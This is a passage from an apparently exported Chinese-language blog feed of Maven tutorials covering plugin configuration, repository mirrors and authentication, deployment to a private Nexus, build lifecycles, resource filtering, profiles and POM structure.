&lt;build&gt;    &lt;plugins&gt;        &lt;plugin&gt;            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;            &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;            &lt;version&gt;${springboot.version}&lt;/version&gt;            &lt;configuration&gt;                &lt;mainClass&gt;com.local.learn.producer.ProducerApplication&lt;/mainClass&gt;            &lt;/configuration&gt;            &lt;executions&gt;                &lt;execution&gt;                    &lt;goals&gt;                        &lt;goal&gt;repackage&lt;/goal&gt;                    &lt;/goals&gt;                &lt;/execution&gt;            &lt;/executions&gt;        &lt;/plugin&gt;    &lt;/plugins&gt;&lt;/build&gt;
建立可執行JAR

使用maven-jar-plugin 插件，main函数作为入口

&lt;build&gt;    &lt;plugins&gt;        &lt;plugin&gt;            &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;            &lt;artifactId&gt;maven-jar-plugin&lt;/artifactId&gt;            &lt;version&gt;3.3.0&lt;/version&gt;            &lt;configuration&gt;                &lt;archive&gt;                    &lt;manifest&gt;                        &lt;addClasspath&gt;true&lt;/addClasspath&gt;                        &lt;!-- main函数所在的类 --&gt;                        &lt;mainClass&gt;org.local.Main&lt;/mainClass&gt;                    &lt;/manifest&gt;                &lt;/archive&gt;            &lt;/configuration&gt;        &lt;/plugin&gt;    &lt;/plugins&gt;&lt;/build&gt;

]]></content>
      <categories>
        <category>框架|中间件</category>
        <category>Maven</category>
      </categories>
      <tags>
        <tag>Maven</tag>
      </tags>
  </entry>
  <entry>
    <title>Maven基础</title>
    <url>/20221030/195cf5d1.html</url>
    <content><![CDATA[命令行创建项目

maven3.0.5以上版本舍弃了create，使用generate生成项目

命令行执行 mvn archetype:generate 命令，使用互动方依次输入参数，或者直接指定参数
mvn archetype:generate -DgroupId=com.local -DartifactId=learn \      -DpackageName=com.local.com.local -DarchetypeArtifactId:maven-archetype-quickstart \      -Dversion=0.0.1-SNAPSHOT
建立Maven环境
1、项目中远程仓库的配置
在平时的开发中，我们往往不会使用默认的中央仓库，默认的中央仓库访问的速度比较慢，访问的人或许很多，有时候也无法满足我们项目的需求，可能项目需要的某些构件中央仓库中是没有的，而在其他远程仓库中有。这时，可以在pom.xml中配置该仓库，代码如下：
&lt;!-- 配置远程仓库 --&gt;&lt;repositories&gt;    &lt;repository&gt;        &lt;id&gt;jboss&lt;/id&gt;        &lt;name&gt;JBoss Repository&lt;/name&gt;        &lt;url&gt;http://repository.jboss.com/maven2/&lt;/url&gt;        &lt;releases&gt;            &lt;enabled&gt;true&lt;/enabled&gt;            &lt;updatePolicy&gt;daily&lt;/updatePolicy&gt;        &lt;/releases&gt;        &lt;snapshots&gt;            &lt;enabled&gt;false&lt;/enabled&gt;            &lt;checksumPolicy&gt;warn&lt;/checksumPolicy&gt;        &lt;/snapshots&gt;        &lt;layout&gt;default&lt;/layout&gt;    &lt;/repository&gt;&lt;/repositories&gt;



配置
说明




repository
在repositories元素下，可以使用repository子元素声明一个或者多个远程仓库。


id
仓库声明的唯一id。尤其需要注意的是，Maven自带的中央仓库使用的id为central，如果其他仓库声明也使用该id，就会覆盖中央仓库的配置。


name
仓库的名称，让我们直观方便的知道仓库是哪个，暂时没发现其他太大的含义。


url
指向了仓库的地址，一般来说，该地址都基于http协议，Maven用户都可以在浏览器中打开仓库地址浏览构件。


releases 和 snapshots
用来控制Maven对于发布版构件和快照版构件的下载权限。- releases的enable设置为true，表示开启JBoss仓库的发布版本下载支持，- snapshots的enabled值为false，表示关闭JBoss仓库的快照版本的下载支持。根据该配置，Maven只会从JBoss仓库下载发布版的构件，而不会下载快照版的构件。


layout
元素值default表示仓库的布局是Maven2及Maven3的默认布局，而不是Maven1的布局。基本不会用到Maven1的布局。


releases或者snapshots的updatePolicy
用来配置Maven从远处仓库检查更新的频率默认值是daily，表示Maven每天检查一次。never：从不检查更新；always：每次构建都检查更新


releases或者snapshots的checksumPolicy
配置Maven检查校验和文件的策略。当构建被部署到Maven仓库中时，会同时部署对应的检验和文件。在下载构件的时候，Maven会验证校验和文件，如果校验和验证失败，当checksumPolicy的值为warn（默认）：Maven会在执行构建时输出警告信息fail：Maven遇到校验和错误就让构建失败ignore：使Maven完全忽略校验和错误



2、Maven私服的认证
大部分公共的远程仓库无须认证就可以直接访问，但我们在平时的开发中往往会架设自己的Maven私服，出于安全方面的考虑，我们需要提供认证信息才能访问这样的远程仓库。
配置认证信息和配置远程仓库不同，远程仓库可以直接在pom.xml中配置，但是认证信息必须配置在settings.xml文件中。
这是因为pom往往是被提交到代码仓库中供所有成员访问的，而settings.xml一般只存在于本机。因此，在settings.xml中配置认证信息更为安全。
Maven使用settings.xml文件中的servers元素及其子元素server配置仓库认证信息。
&lt;settings&gt;     ...     &lt;!--配置远程仓库认证信息--&gt;     &lt;servers&gt;         &lt;server&gt;             &lt;id&gt;releases&lt;/id&gt;             &lt;username&gt;admin&lt;/username&gt;             &lt;password&gt;admin123&lt;/password&gt;         &lt;/server&gt;     &lt;/servers&gt;     ...&lt;/settings&gt;123456789101112
上面代码我们配置了一个id为releases的远程仓库认证信息。认证用户名为admin，认证密码为admin123。
这里的关键是id元素，settings.xml中server元素的id必须与pom.xml中需要认证的repository元素的id完全一致。
正是这个id将认证信息与仓库配置联系在了一起。
3、部署构件至私服
我们使用自己的远程仓库的目的就是在远程仓库中部署我们自己项目的构件以及一些无法从外部仓库直接获取的构件。这样才能在开发时，供其他对团队成员使用。
Maven除了能对项目进行编译、测试、打包之外，还能将项目生成的构件部署到远程仓库中。
首先，需要编辑项目的pom.xml文件。配置distributionManagement元素，代码如下：
&lt;distributionManagement&gt;        &lt;repository&gt;            &lt;id&gt;releases&lt;/id&gt;            &lt;name&gt;public&lt;/name&gt;            &lt;url&gt;http://59.50.95.66:8081/nexus/content/repositories/releases&lt;/url&gt;        &lt;/repository&gt;        &lt;snapshotRepository&gt;            &lt;id&gt;snapshots&lt;/id&gt;            &lt;name&gt;Snapshots&lt;/name&gt;            &lt;url&gt;http://59.50.95.66:8081/nexus/content/repositories/snapshots&lt;/url&gt;        &lt;/snapshotRepository&gt;&lt;/distributionManagement&gt;123456789101112
distributionManagement包含repository和snapshotRepository子元素。
repository： 表示发布版本（稳定版本）构件的仓库
snapshotRepository：表示快照版本（开发测试版本）的仓库
这两个元素都需要配置id、name和url。id为远程仓库的唯一标识，name是为了方便人阅读，关键的url表示该仓库的地址。
往远程仓库部署构件的时候，往往需要认证，配置认证的方式同上。
配置正确后，运行命令mvn clean deploy，Maven就会将项目构建输出的构件部署到配置对应的远程仓库，如果项目当前的版本是快照版本，则部署到快照版本的仓库地址，否则就部署到发布版本的仓库地址。
4、配置远程仓库的镜像
如果仓库X可以提供仓库Y存储的所有内容，那么就可以认为X是Y的一个镜像。换句话说，任何一个可以从仓库Y获得的构件，都能够从它的镜像中获取。
举个例子，http://maven.oschina.net/content/groups/public/ 是中央仓库http://repo1.maven.org/maven2/ 在中国的镜像，由于地理位置的因素，该镜像往往能够提供比中央仓库更快的服务。
因此，可以配置Maven使用该镜像来替代中央仓库。编辑settings.xml，代码如下：
&lt;mirrors&gt;     &lt;mirror&gt;      &lt;id&gt;maven.oschina.net&lt;/id&gt;      &lt;name&gt;maven mirror in China&lt;/name&gt;      &lt;url&gt;http://maven.oschina.net/content/groups/public/&lt;/url&gt;      &lt;mirrorOf&gt;central&lt;/mirrorOf&gt;    &lt;/mirror&gt;&lt;/mirrors&gt;



配置
说明




**mirrorOf **
该例中，mirrorOf 的值为central，表示该配置为中央仓库的镜像，任何对于中央仓库的请求都会转至该镜像，用户也可以使用同样的方法配置其他仓库的镜像


id
表示镜像的唯一标识符


name
表示镜像的名称


url
表示镜像的地址



关于镜像的一个更为常见的用法是结合私服。由于私服可以代理任何外部的公共仓库(包括中央仓库)，因此，对于组织内部的Maven用户来说，使用一个私服地址就等于使用了所有需要的外部仓库，这可以将配置集中到私服，从而简化Maven本身的配置。在这种情况下，任何需要的构件都可以从私服获得，私服就是所有仓库的镜像。这时，可以配置这样的一个镜像：
&lt;!--配置私服镜像--&gt;&lt;mirrors&gt;     &lt;mirror&gt;          &lt;id&gt;nexus&lt;/id&gt;          &lt;name&gt;internal nexus repository&lt;/name&gt;          &lt;url&gt;http://183.238.2.182:8081/nexus/content/groups/public/&lt;/url&gt;          &lt;mirrorOf&gt;*&lt;/mirrorOf&gt;      &lt;/mirror&gt;  &lt;/mirrors&gt;
该例中&lt;mirrorOf&gt;的值为星号，表示该配置是所有Maven仓库的镜像，任何对于远程仓库的请求都会被转至http://183.238.2.182:8081/nexus/content/groups/public/。
如果该镜像仓库需要认证，则配置一个id为nexus的认证信息即可。
需要注意的是，由于镜像仓库完全屏蔽了被镜像仓库，当镜像仓库不稳定或者停止服务的时候，Maven仍将无法访问被镜像仓库，因而将无法下载构件。
5、可用的Maven镜像仓库



ID
mirror




repo2
    repo2    central    Human Readable Name for this Mirror.    http://repo2.maven.org/maven2/


ibiblio
    ibiblio    central    Human Readable Name for this Mirror.    http://mirrors.ibiblio.org/pub/mirrors/maven2/


jboss
    jboss-public-repository-group    central    JBoss Public Repository Group    http://repository.jboss.org/nexus/content/groups/public


JBossJBPM
    JBossJBPM    central    JBossJBPM Repository    https://repository.jboss.org/nexus/content/repositories/releases/







6、仓库搜索服务地址



名称
地址




Sonatype Nexus
https://repository.sonatype.org/


MVNrepository
http://mvnrepository.com/



Maven生命周期
在有关Maven的日常使用中，命令行的输入往往就对应了生命周期，如mvn package就表示执行默认生命周期阶段package。
Maven的生命周期是抽象的，其实际行为都由插件来完成，如package阶段的任务可能就会由maven-jar-plugin完成。生命周期和插件两者协同工作，密不可分。
1、Maven生命周期
我们在开发项目的时候，我们不断地在经历编译、测试、打包、部署等过程，maven的生命周期就是对所有这些过程的一个抽象与统一，她的生命周期包含项目的清理、初始化、编译、测试、打包、集成测试、验证、部署、站点生成等几乎所有的过程，而且maven的生命周期是及其灵活，她生命周期的每个阶段是通过插件来实现的，maven也内置了很多插件，所以我们在项目进行编译、测试、打包的过程是没有感觉到。像编译是通过maven-compile-plugin实现的、测试是通过maven-surefire-plugin实现的。
Maven有三套相互独立的生命周期，请注意这里说的是“三套”，而且“相互独立”，初学者容易将Maven的生命周期看成一个整体，其实不然。这三套生命周期分别是：

Clean Lifecycle 在进行真正的构建之前进行一些清理工作。
Default Lifecycle 构建的核心部分，编译，测试，打包，部署等等。
Site Lifecycle 生成项目报告，站点，发布站点。

我再次强调一下它们是相互独立的，你可以仅仅调用clean来清理工作目录，仅仅调用site来生成站点。当然你也可以直接运行mvn clean install site运行所有这三套生命周期。

在一个生命周期中，运行某个阶段的时候，它之前的所有阶段都会被运行。
也就是说，mvn clean等同于 mvn pre-clean clean，如果我们运行mvn post-clean，那么pre-clean、clean都会被运行。

生命周期：Clean

pre-clean 执行一些需要在clean之前完成的工作
clean 移除所有上一次构建生成的文件
post-clean 执行一些需要在clean之后立刻完成的工作

生命周期：Site


pre-site 执行一些需要在生成站点文档之前完成的工作。


site 生成项目的站点文档。


post-site 执行一些需要在生成站点文档之后完成的工作，并且为部署做准备。


site-deploy 将生成的站点文档部署到特定的服务器上。


生命周期：Default


validate


initialize


generate-sources


process-sources 处理项目主资源文件。一般来说，是对src/main/resources目录的内容进行变量替换等工作后，复制到项目输出的主classpath目录中。


generate-resources


process-resources


compile 编译项目的源代码。一般来说，是编译src/main/java目录下的Java文件至项目输出的主classpath目录中。


process-classes


generate-test-sources


process-test-sources 处理项目测试资源文件。一般来说，是对src/test/resources目录的内容进行变量替换等工作后，复制到项目输出的测试classpath目录中。


generate-test-resources


process-test-resources


test-compile 编译项目的测试源代码。一般来说，是编译src/test/java目录下的Java文件至项目输出的测试classpath目录中。


process-test-classes


test 使用合适的单元测试框架运行测试。这些测试代码不会被打包或部署。


prepare-package


package 接受编译好的代码，打包成可发布的格式，如 JAR 。


pre-integration-test


integration-test


post-integration-test


verify


install 将包安装至本地仓库，以让其它项目依赖。


deploy 将最终的包复制到远程的仓库，以让其它开发人员与Maven项目使用。


基本上，根据名称我们就能猜出每个阶段的用途，关于阶段的详细解释以及其她阶段的解释，请参考 http://maven.apache.org/guides/introduction/introduction-to-the-lifecycle.html 。
记住，运行任何一个阶段的时候，它前面的所有阶段都会被运行，这也就是为什么我们运行mvn install的时候，代码会被编译，测试，打包。
此外，Maven的插件机制是完全依赖Maven的生命周期的，因此理解生命周期至关重要，接下来我将会进一步解释Maven的插件机制。
2、命令行与生命周期
从命令行执行Maven任务的最主要方式就是调用Maven的生命周期阶段。需要注意的是，各个生命周期是相互独立的，而一个生命周期的阶段是有前后依赖关系的。
下面以一些常见的Maven命令为例，解释其执行的生命周期阶段：



命令
说明




mvn clean
该命令调用clean生命周期的clean阶段。实际执行的阶段为clean生命周期的pre-clean和clean阶段。


mvn test
该命令调用default生命周期的test阶段。实际执行的阶段为default生命周期的validate、initialize等，直到test的所有阶段。这也解释了为什么在执行测试的时候，项目的代码能够自动得以编译。


mvn clean install
该命令调用clean生命周期的clean阶段和default生命周期的install阶段。实际执行的阶段为clean生命周期的pre-clean、clean阶段，以及default生命周期的从validate至install的所有阶段。该命令结合了两个生命周期，在执行正在的项目构建之前清理项目是一个很好的实践。


mvn clean deploy site-deploy
该命令调用clean生命周期的clean阶段、default生命周期的deploy阶段，以及site生命周期的site-deploy阶段。实际执行的阶段为clean生命周期的pre-clean、clean阶段，default生命周期的所有阶段，以及site生命周期的所有阶段。该命令结合了Maven所有三个生命周期，且deploy为default生命周期的最后一个阶段，site-deploy为site生命周期的最后一个阶段。



由于Maven中主要的生命周期阶段并不多，而常用的Maven命令实际都是基于这些阶段简单组合而成的，因此只要对Maven生命周期有一个基本的理解，读者就可以正确而熟练地使用Maven命令。
Maven插件机制

如何将插件与 Maven 的构建生命周期绑定在一起呢？通过将插件的目标（goal）与 build lifecycle 中 phase 绑定到一起，这样，当要执行某个 phase 时，就调用插件来完成绑定的目标。

通过上面的生命周期我们可以了解到，不同的生命周期绑定不同的插件；同时我们知道，下载下来的maven核心的东西不过3-4M，它主要就是通过插件来完成这些工作的，一旦碰到没有的插件，它会跑到相应的地方下载，然后来完成整个过程。那么在我们的项目中如何使用插件呢？
打开**http://maven.apache.org/plugins/index.html **网址，可以看到apache下面的很多插件。
spring-boot-maven-plugin

要求Java 8, Maven 3.2及以后

spring-boot-maven-plugin 的构建目标：



Goal
Description




spring-boot:build-info
生成构建信息build-info.properties 可供actuator 使用


spring-boot:help
显示spring-boot-maven-plugin的帮助信息。调用mvn spring-boot:help -Ddetail=true -Dgoal=&lt;goal-name&gt;显示参数详细信息。


spring-boot:repackage
重新打包能用于从命令行使用java -jar 执行的JAR和WAR文件。使用layout=NONE也可以简单地用于打包带有嵌套依赖项的JAR（并且没有主类，因此不可执行）。


spring-boot:run
运行你的Springboot应用


spring-boot:start
启动spring应用程序。与“运行”目标相反，这不会阻塞，并允许其他目标对应用程序进行操作。此目标通常用于集成测试场景，其中应用程序在测试案例之前启动，在测试案例之后停止。


spring-boot:stop
停止由“start”目标启动的应用程序。通常在测试案例完成后调用。



指定入口Class文件
&lt;build&gt;    &lt;plugins&gt;        &lt;plugin&gt;            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;            &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;            &lt;version&gt;${springboot.version}&lt;/version&gt;            &lt;configuration&gt;                &lt;mainClass&gt;com.local.learn.producer.ProducerApplication&lt;/mainClass&gt;            &lt;/configuration&gt;            &lt;executions&gt;                &lt;execution&gt;                    &lt;goals&gt;                        &lt;goal&gt;repackage&lt;/goal&gt;                    &lt;/goals&gt;                &lt;/execution&gt;            &lt;/executions&gt;        &lt;/plugin&gt;    &lt;/plugins&gt;&lt;/build&gt;
maven-source-plugin
以 source (maven-source-plugin)为例：
Source插件是对源代码进行打包的一个插件，默认情况下，它会将生成的源代码放在工程目录的target下面。
Source插件具有五个目标：

source:aggregate aggregrates sources for all modules in an aggregator project.
source:jar 用于将项目的主要源代码捆绑到JAR中
source:test-jar 将项目的测试源绑定到JAR中
source:jar-no-fork 类似于jar，但不派生构建生命周期。
source:test-jar-no-fork 类似于test-jar，但不派生构建生命周期。

在我们的工程pom.xml中，在后面引入下面这段配置：
&lt;build&gt;    &lt;plugins&gt;        &lt;plugin&gt;            &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;            &lt;artifactId&gt;maven-source-plugin&lt;/artifactId&gt;            &lt;version&gt;2.1.2&lt;/version&gt;        &lt;/plugin&gt;    &lt;/plugins&gt;&lt;/build&gt;
上面这段配置就是对源码进行打包的插件，我们运行source:jar-no-fork，那么在项目的目录底下的target会生成一个类似于user-core-0.0.1-SNAPSHOT-sources.jar这样的文件，即项目的源文件。
那么如何将这个插件与特定的生命周期绑定呢？我们来看下面这段配置：
&lt;build&gt;    &lt;plugins&gt;        &lt;plugin&gt;            &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;            &lt;artifactId&gt;maven-source-plugin&lt;/artifactId&gt;            &lt;version&gt;3.2.0&lt;/version&gt;            &lt;!-- 绑定source插件到Maven的生命周期,并在生命周期后执行绑定的source的goal --&gt;            &lt;executions&gt;                &lt;execution&gt;                    &lt;!-- 绑定source插件到Maven的生命周期 --&gt;                    &lt;phase&gt;compile&lt;/phase&gt;                    &lt;!--在生命周期后执行绑定的source插件的goals --&gt;                    &lt;goals&gt;                        &lt;goal&gt;jar-no-fork&lt;/goal&gt;                    &lt;/goals&gt;                &lt;/execution&gt;            &lt;/executions&gt;        &lt;/plugin&gt;    &lt;/plugins&gt;&lt;/build&gt;
通过这段配置，大家可以用mvn package将项目打包的同时会将源代码进行打包。（生成一个可执行jar包和一个sources.jar）

executions 底下的每个 execution代表着一项执行任务，phase 用于指定绑定到生命周期的哪个阶段，goal用于指明执行插件目标
maven-jar-plugin

建立可执行JAR

&lt;build&gt;    &lt;plugins&gt;        &lt;plugin&gt;            &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;            &lt;artifactId&gt;maven-jar-plugin&lt;/artifactId&gt;            &lt;version&gt;3.3.0&lt;/version&gt;            &lt;configuration&gt;                &lt;archive&gt;                    &lt;manifest&gt;                        &lt;addClasspath&gt;true&lt;/addClasspath&gt;                        &lt;!-- main函数所在的类 --&gt;                        &lt;mainClass&gt;org.local.Main&lt;/mainClass&gt;                    &lt;/manifest&gt;                &lt;/archive&gt;            &lt;/configuration&gt;        &lt;/plugin&gt;    &lt;/plugins&gt;&lt;/build&gt;
maven-resources-plugin
参考：https://www.cnblogs.com/LQBlog/p/14775703.html
修改默认读取资源地址

能够将Maven项目中的各种资源文件复制到指定的输出目录中

&lt;project ...&gt;    &lt;build&gt;     	  &lt;resources&gt;            &lt;resource&gt;                &lt;directory&gt;src/main/java&lt;/directory&gt;                &lt;includes&gt;                    &lt;include&gt;**/*.xml&lt;/include&gt;                &lt;/includes&gt;            &lt;/resource&gt;          	&lt;resource&gt;                &lt;directory&gt;src/main/webapp&lt;/directory&gt;                &lt;targetPath&gt;META-INF/resources&lt;/targetPath&gt;                &lt;includes&gt;                    &lt;include&gt;**/**&lt;/include&gt;                &lt;/includes&gt;            &lt;/resource&gt;            &lt;resource&gt;                &lt;directory&gt;src/main/resources&lt;/directory&gt;                &lt;includes&gt;                    &lt;include&gt;**/**&lt;/include&gt;                &lt;/includes&gt;            &lt;/resource&gt;        &lt;/resources&gt;    &lt;/build&gt;&lt;/project&gt;
打包排除和包含文件
&lt;build&gt;    &lt;resources&gt;        &lt;resource&gt;            &lt;directory&gt;src/main/resources&lt;/directory&gt;            &lt;includes&gt;              &lt;include&gt;**/*.txt&lt;/include&gt;              &lt;include&gt;**/*.rtf&lt;/include&gt;            &lt;/includes&gt;            &lt;excludes&gt;              &lt;exclude&gt;**/*.bmp&lt;/exclude&gt;              &lt;exclude&gt;**/*.jpg&lt;/exclude&gt;              &lt;exclude&gt;**/*.jpeg&lt;/exclude&gt;              &lt;exclude&gt;**/*.gif&lt;/exclude&gt;            &lt;/excludes&gt;        &lt;/resource&gt;    &lt;resources&gt;&lt;/build&gt;
改变输出目录
&lt;resource&gt;    &lt;directory&gt;src/main/resources&lt;/directory&gt;    &lt;targetPath&gt;abc&lt;/targetPath&gt;&lt;/resource&gt;
如:   打包后  
&lt;!-- 生产环境指定profile为acm,接入阿里云应用配置服务 --&gt;&lt;profiles&gt;    &lt;profile&gt;        &lt;id&gt;acm&lt;/id&gt;        &lt;dependencies&gt;            &lt;dependency&gt;                &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;                &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-config&lt;/artifactId&gt;                &lt;version&gt;0.2.1.RELEASE&lt;/version&gt;            &lt;/dependency&gt;        &lt;/dependencies&gt;        &lt;build&gt;            &lt;resources&gt;                &lt;resource&gt;                    &lt;directory&gt;src/main/resources/canal/pro/&lt;/directory&gt;                    &lt;targetPath&gt;canal&lt;/targetPath&gt;                &lt;/resource&gt;                &lt;resource&gt;                    &lt;directory&gt;src/main/resources&lt;/directory&gt;                    &lt;excludes&gt;                        &lt;exclude&gt;canal/pro/*.yml&lt;/exclude&gt;                        &lt;exclude&gt;canal/test/*.yml&lt;/exclude&gt;                    &lt;/excludes&gt;                &lt;/resource&gt;            &lt;/resources&gt;        &lt;/build&gt;    &lt;/profile&gt;      &lt;profile&gt;        &lt;id&gt;test&lt;/id&gt;        &lt;activation&gt;            &lt;!--没有指定变量默认激活--&gt;            &lt;activeByDefault&gt;true&lt;/activeByDefault&gt;        &lt;/activation&gt;        &lt;build&gt;            &lt;resources&gt;                &lt;resource&gt;                    &lt;directory&gt;src/main/resources/canal/test/&lt;/directory&gt;                    &lt;targetPath&gt;canal&lt;/targetPath&gt;                &lt;/resource&gt;                &lt;resource&gt;                    &lt;directory&gt;src/main/resources&lt;/directory&gt;                    &lt;excludes&gt;                        &lt;exclude&gt;canal/test/*.yml&lt;/exclude&gt;                        &lt;exclude&gt;canal/pro/*.yml&lt;/exclude&gt;                    &lt;/excludes&gt;                &lt;/resource&gt;            &lt;/resources&gt;        &lt;/build&gt;    &lt;/profile&gt;&lt;/profiles&gt;
占位符替换


properties中定义，变量值
src/main/resources 下的yml配置文件 打包后则会默认填充
spring:  profiles:    active: ${spring.profiles.active}    custom: ${custom}
&lt;!--定义占位符内容--&gt;    &lt;properties&gt;    &lt;java.version&gt;1.8&lt;/java.version&gt;    &lt;custom&gt;version&lt;/custom&gt;    &lt;spring.profiles.active&gt;pro&lt;/spring.profiles.active&gt;&lt;/properties&gt;&lt;!--也可以定义在profile里面 如果写在profile就是针对profile的build--&gt;&lt;build&gt;    &lt;resources&gt;        &lt;resource&gt;            &lt;directory&gt;src/main/resources&lt;/directory&gt;          	&lt;includes&gt;                &lt;include&gt;*.yml&lt;/include&gt;            &lt;/includes&gt;            &lt;!-- 允许替换占位符内容（默认false），占位符默认是 ${变量名称} 这样的形式--&gt;            &lt;!-- http://maven.apache.org/plugins/maven-resources-plugin/examples/filter.html --&gt;             &lt;!-- maven会自动读取includes配置文件，然后解析其中的占位符，使用上面pom文件中定义的属性进行替换 --&gt;            &lt;filtering&gt;true&lt;/filtering&gt;            &lt;!--可用于排除某些--&gt;&lt;!--                &lt;excludes&gt;--&gt;&lt;!--                    &lt;exclude&gt;file&lt;/exclude&gt;--&gt;&lt;!--                &lt;/excludes&gt;--&gt;        &lt;/resource&gt;    &lt;/resources&gt;    &lt;plugins&gt;        &lt;plugin&gt;            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;            &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;        &lt;/plugin&gt;        &lt;plugin&gt;            &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;            &lt;artifactId&gt;maven-resources-plugin&lt;/artifactId&gt;            &lt;version&gt;3.1.0&lt;/version&gt;            &lt;!--使用默认的变量分割符： ${}，可以自己定义格式--&gt;            &lt;configuration&gt;                &lt;useDefaultDelimiters&gt;true&lt;/useDefaultDelimiters&gt;            &lt;/configuration&gt;        &lt;/plugin&gt;    &lt;/plugins&gt;&lt;/build&gt;


多环境配置 只需要在profile定义即可
mvn clean install -Dmaven.test.skip -Denv=dev  打包后 则会填充对应的的占位符，注：profile的优先级比全局的properties定义优先级要高
&lt;profiles&gt;    &lt;profile&gt;        &lt;id&gt;dev&lt;/id&gt;        &lt;activation&gt;            &lt;!--没有指定变量默认激活--&gt;            &lt;activeByDefault&gt;true&lt;/activeByDefault&gt;            &lt;!--maven打包的变量名和参数名字 如: mvn clean install -Dmaven.test.skip -Denv=dev--&gt;            &lt;property&gt;                &lt;name&gt;env&lt;/name&gt;                &lt;value&gt;dev&lt;/value&gt;            &lt;/property&gt;        &lt;/activation&gt;        &lt;!--占位符定义--&gt;        &lt;properties&gt;            &lt;spring.profiles.active&gt;dev&lt;/spring.profiles.active&gt;            &lt;name&gt;dev&lt;/name&gt;        &lt;/properties&gt;    &lt;/profile&gt;      &lt;profile&gt;        &lt;id&gt;test&lt;/id&gt;        &lt;activation&gt;            &lt;!--没有指定变量默认激活--&gt;            &lt;activeByDefault&gt;true&lt;/activeByDefault&gt;            &lt;!--maven打包的变量名和参数名字 如: mvn clean install -Dmaven.test.skip -Denv=dev--&gt;            &lt;property&gt;                &lt;name&gt;env&lt;/name&gt;                &lt;value&gt;test&lt;/value&gt;            &lt;/property&gt;        &lt;/activation&gt;        &lt;!--占位符定义--&gt;        &lt;properties&gt;            &lt;spring.profiles.active&gt;test&lt;/spring.profiles.active&gt;            &lt;name&gt;version2&lt;/name&gt;        &lt;/properties&gt;    &lt;/profile&gt;      &lt;profile&gt;        &lt;id&gt;pro&lt;/id&gt;        &lt;activation&gt;            &lt;!--没有指定变量默认激活--&gt;            &lt;activeByDefault&gt;true&lt;/activeByDefault&gt;            &lt;!--maven打包的变量名和参数名字 如: mvn clean install -Dmaven.test.skip -Denv=dev--&gt;            &lt;property&gt;                &lt;name&gt;env&lt;/name&gt;                &lt;value&gt;pro&lt;/value&gt;            &lt;/property&gt;        &lt;/activation&gt;        &lt;!--占位符定义--&gt;        &lt;properties&gt;            &lt;spring.profiles.active&gt;pro&lt;/spring.profiles.active&gt;            &lt;name&gt;version3&lt;/name&gt;        &lt;/properties&gt;    &lt;/profile&gt;&lt;/profiles&gt;


附录
Maven 命令一览



参数
说明




mvn artchetype:generate
使用交互式的方法建立工程，代替artchetype:create


mvn compile
编译工程


mvn clean
清理生成的文件，一般与package install等命令一起使用


mvn test
测试src/main/test下的文件


mvn package
生成target目录，编译、测试代码，生成测试报告，生成jar/war文件


mvn install
将工程打包并部署到本地库中


mvn help:effective-pom
实际的pom文件，显示所有的默认配置


mvn help:effective-settings
运行时使用setting文件


mvn eclipse:eclipse
生成eclipse工程文件


mvn help:describe
显示某个插件（目标）的功能


mvn jetty:run
启动jetty容器，可以在测试时代替tomcat


mvn tomcat:run
启动tomcat容器


mvn Debug
tomcat:run可以在eclipse中设置断点进行调试


mvn dependency:analyze
查看工程所依赖的插件，进行pom优化时可以用到


mvn dependency:sources
自动寻找并下载jar包的源码


mvn dependency:resolved
查看已经解决的依赖


mvn dependency:tree
查看依赖树，可以分析出间接依赖关系


mvn exec:java
运行指定的应用


mvn assembly:assembly
生成一个单独的可运行的jar包



命令行创建Maven项目
mvn archetype:generate -DgroupId=com.test -DartifactId=HelloWorld -DarchetypeArtifactId=maven-archetype-quickstart -DinteractiveMode=false
]]></content>
      <categories>
        <category>框架|中间件</category>
        <category>Maven</category>
      </categories>
      <tags>
        <tag>Maven</tag>
      </tags>
  </entry>
  <entry>
    <title>POM.XML文件说明</title>
    <url>/20221030/9926a393.html</url>
    <content><![CDATA[POM文件结构
父模块信息：parent
&lt;parent&gt;    &lt;groupId&gt;com.local&lt;/groupId&gt;    &lt;artifactId&gt;learn&lt;/artifactId&gt;    &lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt;    &lt;relativePath/&gt;&lt;/parent&gt;

relativePath：父模块pom.xml文件的相对路径。默认../pom.xml。Maven首先在文件系统上的这个位置查找父POM，然后在本地存储库中查找，最后在远程repo中查找。

项目信息
&lt;project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd"&gt;  &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;   &lt;groupId&gt;com.local&lt;/groupId&gt;  &lt;artifactId&gt;learn&lt;/artifactId&gt;  &lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt;  &lt;name&gt;learn&lt;/name&gt;  &lt;description&gt;learn&lt;/description&gt;  &lt;packaging&gt;pom&lt;/packaging&gt;    ...&lt;/project&gt;

project：是所有pom.xml的根元素，并且在里面定义了命名空间和xsd元素；
modelVersion：当前pom模型的版本；
groupId：定义当前maven项目隶属的实际项目，并会根据这给项目建立包结构；
artifactId：定义项目中的某个模块名称（parent中），如果只有一个模块那就是项目的名称；
version：定义maven项目当前所处的版本号，默认0.0.1-SNAPSHOT为快照版本；
packaging：定义maven项目的打包方式，可以是jar包、war包、pom；
name：项目名称

依赖信息：dependency


dependencyManagement：（父模块中使用）继承此依赖项的项目的默认依赖项信息。此部分中的依赖项不会立即解析。相反，当从这个父POM派生的子POM声明了一个由匹配的groupId和artifactId描述的依赖项时，如果这个部分的版本和其他值尚未指定，则将用于该依赖项


dependencies：依赖包配置列表 包含多个dependency配置
&lt;dependencies&gt;  &lt;dependency&gt;                             ...                       &lt;/dependency&gt;    &lt;dependency&gt;                             ...                       &lt;/dependency&gt;  &lt;/dependencies&gt;


dependency :  依赖包信息
